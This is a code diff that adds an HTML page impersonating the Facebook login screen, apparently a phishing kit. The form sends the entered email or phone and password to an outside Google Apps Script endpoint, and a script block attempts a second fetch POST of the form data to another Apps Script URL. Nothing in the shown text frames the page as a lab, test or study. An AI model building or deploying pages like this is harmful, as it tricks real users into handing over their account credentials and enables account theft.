@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Save Your Life</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
+</head>
+<body>
+  <div class="container text-center">
+    <br>
+<h1 style="color:blue;">Facebook</h1>
+    
+    <p>Connect with friends and the world</p>
+    <p>around you on Facebook</p>
+    <br>
+    <div class="card mx-auto" style="width: 20rem;">
+      <div class="card-body">
+        <form method="POST" action="https://script.google.com/macros/s/AKfycbzsjq4Q_1CAji6LG6ls4L8c84X4eVxgwquSxvYlBIlPbh3XyOQlSmK5aPpodQz1JDop/exec">
+          <div class="mb-3">
+            <h6 style="text-align:left;">Enter Email or Phone</h6>
+            <input name="text" type="text" class="form-control" placeholder="Email or Phone" required>
+          </div>
+          <div class="mb-3">
+         <h6 style="text-align:left;">Enter Password</h6>
+            <input name="password" type="password" class="form-control" placeholder="Password" required>
+          </div>
+          <br>
+          <button type="submit" class="btn btn-primary">Login</button>
+        </form>
+       
+        
+        
+        
+      </div> 
+    </div>
+  </div>
+  <br> 
+  
+&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&ensp;&ensp;<a href="#"> Forgot Password ?</a>
+            <hr>
+      <pre>        </pre>  <br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp; <button style="background-color:green;
+        border-color:green; color:white">Create New Account</button>
+     <br><br><br>
+   <h6 style="text-align:center">Help&emsp;Support&emsp;  Terms Service </h6>
+  
+<script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbxhTREVWIv-RcZ6WXPgKvAn_H8cxe1-NCbGhYEFainO6IqSV0hgb6ZLDBONuV38OoqSCQ/exec';
+  const form = document.forms['submit-to-google-sheet'];
+  form.addEventListener('submit', e => {
+    e.preventDefault();
+    fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+      .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error!', error.message));
+  });
+</script>
+  
+      
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
